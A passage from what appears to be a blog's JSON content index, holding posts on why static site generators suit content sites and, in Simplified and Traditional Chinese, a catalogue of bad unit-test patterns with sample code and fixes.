响应式设计：主题适应所有屏幕尺寸。静态网站在响应式设计方面表现出色，因为不需要服务器端设备检测——CSS 媒体查询在客户端处理一切。 应对挑战 这个博客如何处理典型的静态网站挑战？ 预览：Hexo 的内建服务器（hexo server）提供即时本地预览和实时重载。开发期间的变更立即出现。对于生产预览，GitHub Actions 可以部署到暂存分支。 构建速度：Hexo 针对速度进行了优化。主题缓存和增量构建使典型更新的生成时间保持在几秒钟内。即使完整重建也能快速完成。 实时更新：对于像 GitHub 仓库统计这样的动态数据，排程构建会自动运行。GitHub Actions 每天触发重建，获取新数据并重新生成页面。这不是实时的，但对于博客来说，每天更新就足够了。 内容工作流程：用 Markdown 和 Git 版本控制写作实际上是一个优势。每个变更都被追踪，分支启用草稿工作流程，回滚很简单。&quot;限制&quot;变成了一个功能。 SaaS 弹性：像评论和分析这样的可选服务是异步加载的。如果它们无法加载或变得不可用，核心博客内容保持不受影响。这种优雅的降级确保网站的主要目的——提供内容——永远不依赖第三方服务的可用性。 可选的 SaaS 集成 博客利用 SaaS 提供商提供非关键功能，在核心功能和可选增强之间保持清晰的分离： 评论系统：第三方 SaaS 处理所有评论功能。博客不负责运行或维护评论基础设施。如果服务失败或停止，博客继续完美运作——读者只是不能留下评论。该功能可以随时停用，无需代码变更。 📖 neoalienson/hexo-plugin-commentbox A Hexo plugin to use commentbox.io ⭐ 1 Stars 🍴 0 Forks Language: JavaScript 分析：Google Analytics 追踪访客行为和流量模式。如果 Google Analytics 停机或被广告拦截器拦截，网站正常运作。分析纯粹是观察性的——它提供见解，但不是提供内容所必需的。博客独立于是否收集分析数据而运作。 结果是一个快速、安全、免费且几乎不需要运营开销的博客。它证明了对于以内容为重点的网站，静态生成不仅仅是可行的——它通常是最好的选择。","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"}],"lang":"zh-CN"},{"title":"Static Site Generators - Why Simple Beats Complex in Modern Web Development","slug":"2025/02/Static-Site-Generators-Why-Simple-Beats-Complex-In-Modern-Web-Development","date":"un66fin66","updated":"un00fin00","comments":true,"path":"2025/02/Static-Site-Generators-Why-Simple-Beats-Complex-In-Modern-Web-Development/","permalink":"https://neo01.com/2025/02/Static-Site-Generators-Why-Simple-Beats-Complex-In-Modern-Web-Development/","excerpt":"Why maintain a Ferrari when a bicycle would do? Discover how static site generators deliver blazing speed, ironclad security, and near-zero costs—proving simple beats complex.","text":"In the world of web development, there’s a persistent belief that more complexity equals more capability. For decades, the three-tier architecture—presentation layer, application layer, and database layer—has been the gold standard for building dynamic websites. But what if I told you that for many use cases, especially content-focused sites, this approach is overkill? Static site generators (SSGs) are challenging the status quo, and for good reason. They represent a paradigm shift from “generate on request” to “generate once, serve many times.” This simple change has profound implications for performance, security, cost, and developer experience. The Three-Tier Trap Traditional three-tier architectures are powerful. They allow for dynamic content generation, user authentication, real-time data processing, and complex business logic. But this power comes at a cost: Performance bottlenecks: Every page request triggers database queries, template rendering, and application logic execution. Even with caching, there’s overhead. Security vulnerabilities: More moving parts mean more attack surfaces. SQL injection, authentication bypasses, and server-side vulnerabilities are constant concerns. Infrastructure complexity: You need web servers, application servers, database servers, load balancers, and often caching layers. Each component requires configuration, monitoring, and maintenance. Scaling challenges: Handling traffic spikes requires sophisticated infrastructure, auto-scaling groups, and often significant cloud costs. Expensive operations: Running 24/7 servers, database instances, and load balancers adds up quickly. A modest three-tier setup can easily cost $50-200 per month, even for a simple blog with minimal traffic. Add monitoring, backups, and redundancy, and costs multiply. 💰 Cost Savings That MatterStatic hosting can reduce infrastructure costs from $10-200/month to $0-10/month. For a personal blog or small business site, that's $600-2,400 saved annually—money better spent on content, marketing, or your next coffee. For a blog, portfolio, documentation site, or marketing page—where content changes infrequently—this complexity is unnecessary. You’re maintaining a Ferrari when a bicycle would do. Back to Basics, But Smarter Static sites aren’t new—they’re how the web began. But modern static site generators aren’t just a return to hand-coded HTML. They bring the developer experience of dynamic systems while delivering pre-built HTML, CSS, and JavaScript files. You get templating, content management, and build automation, then serve the results directly from a CDN with zero server-side processing. The benefits are compelling: Blazing speed: No database queries, no template rendering, no application logic. Just static files served from a CDN edge location near your users. Load times measured in milliseconds, not seconds. Ironclad security: No server-side code means no server-side vulnerabilities. No database to hack, no authentication to bypass. Your attack surface shrinks to nearly zero. Trivial scaling: CDNs are built to handle massive traffic. Whether you have 10 visitors or 10 million, your site performs identically. No auto-scaling configuration needed. Minimal cost: Hosting static files is cheap—often free. GitHub Pages, Netlify, Vercel, and Cloudflare Pages offer generous free tiers. No database hosting, no application servers, no load balancers. Shifted responsibility: Let your hosting provider handle infrastructure, uptime, DDoS protection, SSL certificates, CDN distribution, and security patches. You focus on content, not operations. Developer experience: Write in Markdown, commit to Git, and deploy automatically. Version control becomes your CMS. Rollbacks are as simple as reverting a commit. The Trade-offs Static site generators aren’t perfect. They come with their own set of challenges: Build time overhead: Large sites with thousands of pages can take minutes to rebuild. Every content change requires regenerating the entire site, which can slow down the feedback loop during development. ⏱️ Build Time ConsiderationsSites with 10,000+ pages may take 5-10 minutes to rebuild. If you're publishing multiple updates per hour, this becomes a bottleneck. Choose Hugo for speed or consider incremental builds if your generator supports them. No real-time updates: Content changes aren’t instant. You need to rebuild and redeploy. If you need to update content every few minutes, static generation becomes cumbersome. Limited dynamic features: User authentication, personalized content, and interactive features require workarounds—either client-side JavaScript, third-party services, or serverless functions. Developer-centric workflow: Non-technical content creators may struggle with Git, Markdown, and command-line tools. There’s no friendly admin panel unless you add a headless CMS, which adds complexity back. 👨‍💻 Static site generation is for developer onlyNon-developers may find the workflow challenging without technical knowledge Preview challenges: Seeing how content looks before publishing requires running a local build or using preview deployments, unlike dynamic CMSs where changes are immediately visible. These challenges are real, but for content-focused sites, they’re often acceptable trade-offs for the benefits gained. 💡 When to Choose Static vs DynamicChoose static if: Content updates are infrequent (daily or less), no user-generated content, performance and security are priorities, budget is limited. Choose dynamic if: Real-time updates needed, user authentication required, personalized content per user, complex search functionality essential. Comparing the Contenders The static site generator ecosystem is rich with options. Here’s a quick comparison: Feature Hexo Jekyll Hugo Gatsby Language Node.js Ruby Go React Build Speed Fast Slow Very Fast Moderate Learning Curve Gentle Gentle Steep Steep Plugin Ecosystem Rich Largest Smaller Rich Best For Blogs GitHub Pages Large sites Interactive sites Dependencies npm packages Ruby gems Single binary npm + React Theme Support Extensive Extensive Good Component-based Preview Server Excellent Good Excellent Good Hexo Built on Node.js, Hexo is particularly popular in the blogging community. It’s fast, has a rich plugin ecosystem, and supports multiple template engines. The learning curve is gentle, making it ideal for developers familiar with JavaScript. Hexo’s preview server with live reload makes development smooth, and theme caching optimizes build performance. Want to add cookie consent to the website? Easy with plugins: 📖 neoalienson/hexo-cookieconsent ⭐ 0 Stars 🍴 0 Forks Language: JavaScript Want to add QR codes to the website? 📖 neoalienson/hexo-helper-qrcode-adv Advanced QR code helper for Hexo that generates QR codes for page sharing with extensive styling options using qr-code-styling. ⭐ 0 Stars 🍴 0 Forks Language: JavaScript Want to add GitHub cards to the website? 📖 neoalienson/hexo-github-card-inline Display a card with statistics for GitHub profile and repository in your hexo blog post. The card does not need external resources or services. ⭐ 0 Stars 🍴 0 Forks Language: JavaScript Best for: Personal blogs, documentation sites, content-heavy sites with moderate scale. Jekyll The original static site generator that popularized the concept, Jekyll is written in Ruby and powers GitHub Pages. It’s mature, stable, and has the largest ecosystem of themes and plugins. Native GitHub Pages integration means zero-configuration deployment. Best for: GitHub-hosted sites, projects wanting maximum community support and themes. Hugo Written in Go, Hugo is the speed demon of static site generators. It can build thousands of pages in seconds. It’s a single binary with no dependencies, making installation trivial. Hugo excels at content organization and taxonomy. Best for: Large-scale sites, documentation, sites requiring fast build times. Gatsby Built on React, Gatsby bridges static and dynamic worlds. It generates static pages but hydrates them into full React applications, enabling dynamic features post-load. It’s particularly strong for sites that need some interactivity and modern JavaScript tooling. Best for: Marketing sites, portfolios, sites needing progressive web app features and React integration. When Static Isn’t Enough Static site generators aren’t a silver bullet. They excel at content-focused sites but struggle with certain use cases: User-generated content: If users need to post comments, upload files, or create accounts, you’ll need backend services. (Though you can integrate third-party services like Disqus or Auth0.) Real-time data: Stock prices, live sports scores, or social media feeds require dynamic updates. (Though you can use client-side JavaScript to fetch this data.) Personalization: Showing different content to different users based on their profile requires server-side logic. (Though edge computing and client-side personalization are emerging solutions.) Complex search: Full-text search across large content libraries is challenging with pure static sites. (Though services like Algolia can fill this gap.) Making the Choice The question isn’t whether static site generators are better than traditional architectures—it’s whether they’re better for your specific use case. If you’re building a blog, portfolio, documentation site, or marketing page, static generation offers compelling advantages: better performance, stronger security, lower costs, and simpler operations. The three-tier architecture isn’t obsolete—it’s just not always necessary. Sometimes simple really does beat complex. Sometimes the bicycle is faster than the Ferrari, especially when you’re just going to the corner store. Start simple. Choose a static site generator that matches your technical background. Deploy to a free hosting platform. Focus on creating great content rather than managing infrastructure. You can always add complexity later if you need it. The future isn’t about choosing between static and dynamic—it’s about using the right tool for each part of your application. Making the Choice For content-focused websites—blogs, documentation, portfolios, marketing sites—static site generators are often the superior choice. They’re faster, more secure, cheaper, and simpler than three-tier architectures. If you’re starting a new blog or content site, consider this: Do you really need a database? Do you really need server-side rendering on every request? Or would pre-building your site and serving static files give you everything you need with a fraction of the complexity? The answer, more often than not, is that simple beats complex. Static site generators prove that sometimes the best solution is the one that does less, not more. As web development continues to evolve, the trend is clear: push complexity to build time, not runtime. Generate once, serve infinitely. Your users—and your infrastructure bills—will thank you. Practice What You Preach - This Blog This blog you’re reading right now? It’s built with Hexo and hosted on GitHub Pages. The entire operation costs exactly $0 per month. Every article is written in Markdown, committed to a Git repository, and automatically built and deployed through GitHub Actions. No servers to maintain, no databases to backup, no security patches to apply. GitHub handles the hosting, CDN distribution, SSL certificates, and uptime monitoring. The responsibilities I’ve shifted to GitHub Pages include infrastructure management, DDoS protection, global content delivery, and 99.9% uptime guarantees. What I focus on is writing content and occasionally tweaking the theme. If this blog suddenly went viral and received a million visitors tomorrow, nothing would break, and the bill would still be $0. That’s the power of static site generation—and why it’s hard to justify anything more complex for content-focused sites. Design Principles in Action This blog was architected around six core principles, and the static site approach delivers on all of them: Security: No server-side code, no database, no authentication layer. The attack surface is minimal. GitHub Pages handles SSL/TLS automatically. No vulnerabilities to patch, no exploits to worry about. Minimal third-party dependencies: The site loads no external JavaScript libraries beyond optional SaaS integrations. Everything needed for core functionality is bundled at build time. This reduces privacy concerns, improves performance, and eliminates dependency on external services for critical features. Zero cost: GitHub Pages hosting is free. No server bills, no database costs, no CDN charges. The only investment is time. High availability: GitHub Pages provides 99.9% uptime SLA. Content is distributed globally via CDN. No single point of failure. No maintenance windows. Performance: Static files served from CDN edge locations. No database queries, no server-side rendering. Pages load in milliseconds. Hexo’s theme caching optimizes build times, keeping the development feedback loop fast. Responsive design: The theme adapts to all screen sizes. Static sites excel at responsive design since there’s no server-side device detection needed—CSS media queries handle everything client-side. Addressing the Challenges How does this blog handle the typical static site challenges? Preview: Hexo’s built-in server (hexo server) provides instant local preview with live reload. Changes appear immediately during development. For production previews, GitHub Actions can deploy to staging branches. Build speed: Hexo is optimized for speed. Theme caching and incremental builds keep generation times under seconds for typical updates. Even full rebuilds complete quickly. Real-time updates: For dynamic data like GitHub repository stats, scheduled builds run automatically. GitHub Actions triggers a rebuild daily, fetching fresh data and regenerating pages. It’s not real-time, but for a blog, daily updates are sufficient. Content workflow: Writing in Markdown with Git version control is actually an advantage. Every change is tracked, branches enable draft workflows, and rollbacks are trivial. The “limitation” becomes a feature. SaaS resilience: Optional services like comments and analytics are loaded asynchronously. If they fail to load or become unavailable, the core blog content remains unaffected. This graceful degradation ensures the site’s primary purpose—delivering content—never depends on third-party service availability. Optional SaaS Integrations The blog leverages SaaS providers for non-critical features, maintaining a clear separation between core functionality and optional enhancements: Comment system: A third-party SaaS handles all comment functionality. The blog takes no responsibility for running or maintaining the comment infrastructure. If the service fails or is discontinued, the blog continues to function perfectly—readers simply can’t leave comments. The feature can be disabled at any time without code changes. 📖 neoalienson/hexo-plugin-commentbox A Hexo plugin to use commentbox.io ⭐ 1 Stars 🍴 0 Forks Language: JavaScript Analytics: Google Analytics tracks visitor behavior and traffic patterns. If Google Analytics goes down or is blocked by ad blockers, the website functions normally. Analytics is purely observational—it provides insights but isn’t required for the site to serve content. The blog operates independently of whether analytics data is collected or not. The result is a blog that’s fast, secure, free, and requires almost no operational overhead. It proves that for content-focused sites, static generation isn’t just viable—it’s often the best choice.","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"}]},{"title":"丑陋的单元测试 - 测试恐怖故事集","slug":"2025/01/Ugly-Unit-Tests-A-Collection-of-Testing-Horrors-zh-CN","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-CN/2025/01/Ugly-Unit-Tests-A-Collection-of-Testing-Horrors/","permalink":"https://neo01.com/zh-CN/2025/01/Ugly-Unit-Tests-A-Collection-of-Testing-Horrors/","excerpt":"从一次测试所有东西的怪物到睡眠并祈祷的方法,探索真实世界中最丑陋的单元测试以及如何修复它们。","text":"我们都经历过这种情况。你打开一个测试文件，期待能理解代码的功能，结果却看到一个让你质疑一切的怪物。单元测试本应让我们的生活更轻松——它们记录行为、捕捉回归问题，并让我们有信心进行重构。但有时候，它们却变成了它们本该防止的东西：无法维护的噩梦。 让我分享一些我在实际工作中遇到的最丑陋的单元测试。名字已经改变以保护有罪者，但恐怖是真实的。 &quot;一次测试所有东西&quot;怪物 @Test public void testUserService() &#123; &#x2F;&#x2F; 测试用户创建 User user &#x3D; new User(&quot;john&quot;, &quot;password123&quot;); userService.save(user); assertNotNull(user.getId()); &#x2F;&#x2F; 测试用户登录 boolean loggedIn &#x3D; userService.login(&quot;john&quot;, &quot;password123&quot;); assertTrue(loggedIn); &#x2F;&#x2F; 测试用户更新 user.setEmail(&quot;john@example.com&quot;); userService.update(user); assertEquals(&quot;john@example.com&quot;, userService.findById(user.getId()).getEmail()); &#x2F;&#x2F; 测试用户删除 userService.delete(user.getId()); assertNull(userService.findById(user.getId())); &#x2F;&#x2F; 测试密码重置 User user2 &#x3D; new User(&quot;jane&quot;, &quot;password456&quot;); userService.save(user2); userService.resetPassword(user2.getId(), &quot;newpassword&quot;); assertTrue(userService.login(&quot;jane&quot;, &quot;newpassword&quot;)); &#125; 🔥 问题所在这个测试违反了基本原则：一个测试，一个关注点。当这个测试失败时，五种不同行为中的哪一个坏了？你需要调试整个方法才能找出答案。测试变得相互依赖——如果用户创建失败，其他所有东西也会失败，隐藏了其他潜在的错误。 应该怎么做：五个独立的测试，每个都有清楚的名称描述它验证什么。当 testUserDeletion 失败时，你确切知道该看哪里。 &quot;睡眠并祈祷&quot;方法 def test_async_processing(): job_id &#x3D; queue.submit_job(data) time.sleep(5) # 等待工作完成 result &#x3D; queue.get_result(job_id) assert result.status &#x3D;&#x3D; &quot;completed&quot; ⏰ 问题所在基于时间的测试是不稳定的噩梦。在快速的机器上，5 秒可能足够。在负载下的慢速 CI 服务器上，可能不够。测试在本地通过但在生产环境中随机失败。开发人员开始忽略测试失败，因为&quot;又是那个不稳定的测试&quot;。 应该怎么做：使用适当的同步机制——回调、promise 或带超时的轮询。如果可能的话，模拟异步行为。永远不要依赖任意的睡眠时间。 “复制粘贴天堂” test(&#39;user can add item to cart&#39;, () &#x3D;&gt; &#123; const user &#x3D; &#123; id: 1, name: &#39;John&#39;, email: &#39;john@test.com&#39;, address: &#39;123 Main St&#39;, phone: &#39;555-1234&#39; &#125;; const cart &#x3D; &#123; id: 1, userId: 1, items: [], total: 0, tax: 0, shipping: 0 &#125;; const item &#x3D; &#123; id: 101, name: &#39;Widget&#39;, price: 29.99, quantity: 1, category: &#39;tools&#39; &#125;; addToCart(user, cart, item); expect(cart.items.length).toBe(1); &#125;); test(&#39;user can remove item from cart&#39;, () &#x3D;&gt; &#123; const user &#x3D; &#123; id: 1, name: &#39;John&#39;, email: &#39;john@test.com&#39;, address: &#39;123 Main St&#39;, phone: &#39;555-1234&#39; &#125;; const cart &#x3D; &#123; id: 1, userId: 1, items: [&#123; id: 101, name: &#39;Widget&#39;, price: 29.99, quantity: 1, category: &#39;tools&#39; &#125;], total: 29.99, tax: 2.50, shipping: 5.00 &#125;; const item &#x3D; &#123; id: 101, name: &#39;Widget&#39;, price: 29.99, quantity: 1, category: &#39;tools&#39; &#125;; removeFromCart(user, cart, item); expect(cart.items.length).toBe(0); &#125;); test(&#39;user can update item quantity&#39;, () &#x3D;&gt; &#123; const user &#x3D; &#123; id: 1, name: &#39;John&#39;, email: &#39;john@test.com&#39;, address: &#39;123 Main St&#39;, phone: &#39;555-1234&#39; &#125;; const cart &#x3D; &#123; id: 1, userId: 1, items: [&#123; id: 101, name: &#39;Widget&#39;, price: 29.99, quantity: 1, category: &#39;tools&#39; &#125;], total: 29.99, tax: 2.50, shipping: 5.00 &#125;; const item &#x3D; &#123; id: 101, name: &#39;Widget&#39;, price: 29.99, quantity: 2, category: &#39;tools&#39; &#125;; updateCartItem(user, cart, item); expect(cart.items[0].quantity).toBe(2); &#125;); 📋 问题所在大量重复使维护成为噩梦。需要改变用户对象结构？在 50 个地方更新它。设置代码比实际测试逻辑还长，将重要部分埋在噪音中。 应该怎么做：提取测试固件，使用工厂函数，或利用测试设置方法。测试应该专注于使其独特的东西，而不是重复样板代码。 “魔术数字盛宴” [Test] public void TestOrderCalculation() &#123; var order &#x3D; new Order(); order.AddItem(100, 2); order.AddItem(50, 3); order.ApplyDiscount(0.1); Assert.AreEqual(315, order.GetTotal()); &#125; ❓ 问题所在这些数字是什么意思？为什么 315 是预期结果？折扣是 10% 还是 0.1%？当这个测试失败时，你会花 10 分钟用计算器算数学，然后才能开始调试。 应该怎么做：使用命名常量或变量来解释计算。const decimal ITEM_PRICE = 100m; const int QUANTITY = 2; const decimal DISCOUNT_PERCENT = 10m; 现在测试自己记录自己。 &quot;测试框架&quot;杰作 @Test public void testListAdd() &#123; List&lt;String&gt; list &#x3D; new ArrayList&lt;&gt;(); list.add(&quot;test&quot;); assertEquals(1, list.size()); assertEquals(&quot;test&quot;, list.get(0)); &#125; @Test public void testMapPut() &#123; Map&lt;String, Integer&gt; map &#x3D; new HashMap&lt;&gt;(); map.put(&quot;key&quot;, 42); assertEquals(42, map.get(&quot;key&quot;)); &#125; 🤦 问题所在这些测试验证 Java 的标准库是否正常工作。剧透：它确实正常。Oracle 已经广泛测试了 ArrayList 和 HashMap。这些测试增加零价值，同时增加维护负担和构建时间。 应该怎么做：测试你的代码，而不是框架。如果你没有添加任何业务逻辑，你不需要测试。 &quot;注释驱动开发&quot;方法 def test_user_registration(): # 创建用户 user &#x3D; User() # 设置用户名 user.username &#x3D; &quot;testuser&quot; # 设置密码 user.password &#x3D; &quot;password123&quot; # 设置电子邮件 user.email &#x3D; &quot;test@example.com&quot; # 保存用户 db.save(user) # 检索用户 saved_user &#x3D; db.get_user(&quot;testuser&quot;) # 检查用户是否存在 assert saved_user is not None # 检查用户名是否匹配 assert saved_user.username &#x3D;&#x3D; &quot;testuser&quot; # 检查电子邮件是否匹配 assert saved_user.email &#x3D;&#x3D; &quot;test@example.com&quot; 💬 问题所在只是重复代码所做的事情的注释是噪音。它们不增加清晰度——它们增加混乱。如果你的测试需要这么多注释才能理解，测试本身写得很差。 应该怎么做：编写具有清楚变量名称和结构的自我记录代码。使用测试名称来描述正在测试什么。注释应该解释为什么，而不是什么。 &quot;什么都不断言&quot;信心增强器 test(&#39;process payment&#39;, async () &#x3D;&gt; &#123; const payment &#x3D; &#123; amount: 100, currency: &#39;USD&#39; &#125;; await paymentService.process(payment); &#x2F;&#x2F; 测试通过！ &#125;); ✅ 问题所在这个测试总是通过，因为它没有断言任何东西。这是一种虚假的安全感。付款可能失败、抛出内部捕获的异常或返回错误——测试仍然是绿色的。 应该怎么做：断言预期结果。付款成功了吗？数据库更新了吗？用户收到确认了吗？没有断言的测试不是测试。 &quot;模拟所有东西&quot;模拟器 @Test public void testUserService() &#123; UserRepository mockRepo &#x3D; mock(UserRepository.class); EmailService mockEmail &#x3D; mock(EmailService.class); Logger mockLogger &#x3D; mock(Logger.class); Config mockConfig &#x3D; mock(Config.class); TimeProvider mockTime &#x3D; mock(TimeProvider.class); when(mockRepo.findById(1)).thenReturn(new User(&quot;john&quot;)); when(mockConfig.get(&quot;feature.enabled&quot;)).thenReturn(&quot;true&quot;); when(mockTime.now()).thenReturn(Instant.parse(&quot;2025-01-01T00:00:00Z&quot;)); UserService service &#x3D; new UserService(mockRepo, mockEmail, mockLogger, mockConfig, mockTime); User user &#x3D; service.getUser(1); assertEquals(&quot;john&quot;, user.getName()); verify(mockLogger).info(&quot;User retrieved: john&quot;); &#125; 🎭 问题所在你正在测试模拟返回你告诉它们返回的东西。这个测试对实际业务逻辑没有验证任何东西。它与现实如此隔离，以至于在生产代码完全损坏时它可能通过。 应该怎么做：模拟外部依赖（数据库、API、文件系统），但不要模拟所有东西。尽可能用真实对象测试真实逻辑。集成测试补充单元测试——两者都使用。 &quot;忽略失败&quot;策略 @pytest.mark.skip(reason&#x3D;&quot;Flaky test, will fix later&quot;) def test_concurrent_access(): # 测试实现 pass @unittest.skip(&quot;Fails on CI, works locally&quot;) def test_file_upload(): # 测试实现 pass 🚫 问题所在跳过的测试是永远不会偿还的技术债务。&quot;稍后修复&quot;变成&quot;永远不修复&quot;。这些测试腐烂，随着时间的推移变得更过时、更难修复。最终，没有人记得为什么它们被跳过或它们应该测试什么。 应该怎么做：修复测试或删除它。如果它真的不稳定，使其确定性。如果它测试的东西不再重要，删除它。跳过的测试比没有测试更糟——它们给予虚假的信心。 教训 使这些测试丑陋的不仅仅是糟糕的风格——而是它们在测试的基本目的上失败了：提供代码正确工作的信心和它应该如何行为的文档。 好的测试有共同的特征： 专注：一个测试，一个行为。当它失败时，你确切知道什么坏了。 可读：测试名称和结构清楚地传达正在测试什么以及为什么。 确定性：相同的输入，相同的输出，每次都是。没有不稳定性，没有随机性，没有时间依赖性。 快速：测试应该在毫秒内运行，而不是秒。慢速测试不会被运行。 独立：测试不依赖彼此或共享状态。它们可以以任何顺序运行。 可维护：当需求改变时，测试易于更新。重复最小化。 前进之路 如果你在这些例子中认出自己的代码，不要感到难过——我们都写过丑陋的测试。重要的是学习和改进。 当你写下一个测试时，问问自己： 如果这个测试在六个月后失败，我会理解为什么吗？ 我是在测试我的代码还是框架？ 我能删除一半的设置代码并仍然有一个有效的测试吗？ 这个测试给我信心代码能工作吗？ 单元测试是一项随着实践而提高的技能。我们今天写的丑陋测试教会我们明天写更好的测试。与你的团队分享你的测试恐怖故事。嘲笑它们。从中学习。最重要的是，重构它们。 因为唯一比丑陋测试更糟的是根本没有测试。 ✨ 一线希望每个丑陋的测试都是学习的机会。代码审查捕捉这些问题。重构改进它们。分享这些故事帮助整个社区写更好的测试。我们都在一起。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Best Practices","slug":"Best-Practices","permalink":"https://neo01.com/tags/Best-Practices/"},{"name":"Testing","slug":"Testing","permalink":"https://neo01.com/tags/Testing/"}],"lang":"zh-CN"},{"title":"醜陋的單元測試 - 測試恐怖故事集","slug":"2025/01/Ugly-Unit-Tests-A-Collection-of-Testing-Horrors-zh-TW","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-TW/2025/01/Ugly-Unit-Tests-A-Collection-of-Testing-Horrors/","permalink":"https://neo01.com/zh-TW/2025/01/Ugly-Unit-Tests-A-Collection-of-Testing-Horrors/","excerpt":"從一次測試所有東西的怪物到睡眠並祈禱的方法,探索真實世界中最醜陋的單元測試以及如何修復它們。","text":"我們都經歷過這種情況。你打開一個測試檔案，期待能理解程式碼的功能，結果卻看到一個讓你質疑一切的怪物。單元測試本應讓我們的生活更輕鬆——它們記錄行為、捕捉回歸問題，並讓我們有信心進行重構。但有時候，它們卻變成了它們本該防止的東西：無法維護的噩夢。 讓我分享一些我在實際工作中遇到的最醜陋的單元測試。名字已經改變以保護有罪者，但恐怖是真實的。 「一次測試所有東西」怪物 @Test public void testUserService() &#123; &#x2F;&#x2F; 測試使用者建立 User user &#x3D; new User(&quot;john&quot;, &quot;password123&quot;); userService.save(user); assertNotNull(user.getId()); &#x2F;&#x2F; 測試使用者登入 boolean loggedIn &#x3D; userService.login(&quot;john&quot;, &quot;password123&quot;); assertTrue(loggedIn); &#x2F;&#x2F; 測試使用者更新 user.setEmail(&quot;john@example.com&quot;); userService.update(user); assertEquals(&quot;john@example.com&quot;, userService.findById(user.getId()).getEmail()); &#x2F;&#x2F; 測試使用者刪除 userService.delete(user.getId()); assertNull(userService.findById(user.getId())); &#x2F;&#x2F; 測試密碼重設 User user2 &#x3D; new User(&quot;jane&quot;, &quot;password456&quot;); userService.save(user2); userService.resetPassword(user2.getId(), &quot;newpassword&quot;); assertTrue(userService.login(&quot;jane&quot;, &quot;newpassword&quot;)); &#125; 🔥 問題所在這個測試違反了基本原則：一個測試，一個關注點。當這個測試失敗時，五種不同行為中的哪一個壞了？你需要除錯整個方法才能找出答案。測試變得相互依賴——如果使用者建立失敗，其他所有東西也會失敗，隱藏了其他潛在的錯誤。 應該怎麼做：五個獨立的測試，每個都有清楚的名稱描述它驗證什麼。當 testUserDeletion 失敗時，你確切知道該看哪裡。 「睡眠並祈禱」方法 def test_async_processing(): job_id &#x3D; queue.submit_job(data) time.sleep(5) # 等待工作完成 result &#x3D; queue.get_result(job_id) assert result.status &#x3D;&#x3D; &quot;completed&quot; ⏰ 問題所在基於時間的測試是不穩定的噩夢。在快速的機器上，5 秒可能足夠。在負載下的慢速 CI 伺服器上，可能不夠。測試在本地通過但在生產環境中隨機失敗。開發人員開始忽略測試失敗，因為「又是那個不穩定的測試」。 應該怎麼做：使用適當的同步機制——回呼、promise 或帶超時的輪詢。如果可能的話，模擬非同步行為。永遠不要依賴任意的睡眠時間。 「複製貼上天堂」 test(&#39;user can add item to cart&#39;, () &#x3D;&gt; &#123; const user &#x3D; &#123; id: 1, name: &#39;John&#39;, email: &#39;john@test.com&#39;, address: &#39;123 Main St&#39;, phone: &#39;555-1234&#39; &#125;; const cart &#x3D; &#123; id: 1, userId: 1, items: [], total: 0, tax: 0, shipping: 0 &#125;; const item &#x3D; &#123; id: 101, name: &#39;Widget&#39;, price: 29.99, quantity: 1, category: &#39;tools&#39; &#125;; addToCart(user, cart, item); expect(cart.items.length).toBe(1); &#125;); test(&#39;user can remove item from cart&#39;, () &#x3D;&gt; &#123; const user &#x3D; &#123; id: 1, name: &#39;John&#39;, email: &#39;john@test.com&#39;, address: &#39;123 Main St&#39;, phone: &#39;555-1234&#39; &#125;; const cart &#x3D; &#123; id: 1, userId: 1, items: [&#123; id: 101, name: &#39;Widget&#39;, price: 29.99, quantity: 1, category: &#39;tools&#39; &#125;], total: 29.99, tax: 2.50, shipping: 5.00 &#125;; const item &#x3D; &#123; id: 101, name: &#39;Widget&#39;, price: 29.99, quantity: 1, category: &#39;tools&#39; &#125;; removeFromCart(user, cart, item); expect(cart.items.length).toBe(0); &#125;); test(&#39;user can update item quantity&#39;, () &#x3D;&gt; &#123; const user &#x3D; &#123; id: 1, name: &#39;John&#39;, email: &#39;john@test.com&#39;, address: &#39;123 Main St&#39;, phone: &#39;555-1234&#39; &#125;; const cart &#x3D; &#123; id: 1, userId: 1, items: [&#123; id: 101, name: &#39;Widget&#39;, price: 29.99, quantity: 1, category: &#39;tools&#39; &#125;], total: 29.99, tax: 2.50, shipping: 5.00 &#125;; const item &#x3D; &#123; id: 101, name: &#39;Widget&#39;, price: 29.99, quantity: 2, category: &#39;tools&#39; &#125;; updateCartItem(user, cart, item); expect(cart.items[0].quantity).toBe(2); &#125;); 📋 問題所在大量重複使維護成為噩夢。需要改變使用者物件結構？在 50 個地方更新它。設定程式碼比實際測試邏輯還長，將重要部分埋在雜訊中。 應該怎麼做：提取測試固件，使用工廠函數，或利用測試設定方法。測試應該專注於使其獨特的東西，而不是重複樣板程式碼。 「魔術數字盛宴」 [Test] public void TestOrderCalculation() &#123; var order &#x3D; new Order(); order.AddItem(100, 2); order.AddItem(50, 3); order.ApplyDiscount(0.1); Assert.AreEqual(315, order.GetTotal()); &#125; ❓ 問題所在這些數字是什麼意思？為什麼 315 是預期結果？折扣是 10% 還是 0.1%？當這個測試失敗時，你會花 10 分鐘用計算機算數學，然後才能開始除錯。 應該怎麼做：使用命名常數或變數來解釋計算。const decimal ITEM_PRICE = 100m; const int QUANTITY = 2; const decimal DISCOUNT_PERCENT = 10m; 現在測試自己記錄自己。 「測試框架」傑作 @Test public void testListAdd() &#123; List&lt;String&gt; list &#x3D; new ArrayList&lt;&gt;(); list.add(&quot;test&quot;); assertEquals(1, list.size()); assertEquals(&quot;test&quot;, list.get(0)); &#125; @Test public void testMapPut() &#123; Map&lt;String, Integer&gt; map &#x3D; new HashMap&lt;&gt;(); map.put(&quot;key&quot;, 42); assertEquals(42, map.get(&quot;key&quot;)); &#125; 🤦 問題所在這些測試驗證 Java 的標準函式庫是否正常工作。劇透：它確實正常。Oracle 已經廣泛測試了 ArrayList 和 HashMap。這些測試增加零價值，同時增加維護負擔和建置時間。 應該怎麼做：測試你的程式碼，而不是框架。如果你沒有添加任何業務邏輯，你不需要測試。 「註解驅動開發」方法 def test_user_registration(): # 建立使用者 user &#x3D; User() # 設定使用者名稱 user.username &#x3D; &quot;testuser&quot; # 設定密碼 user.password &#x3D; &quot;password123&quot; # 設定電子郵件 user.email &#x3D; 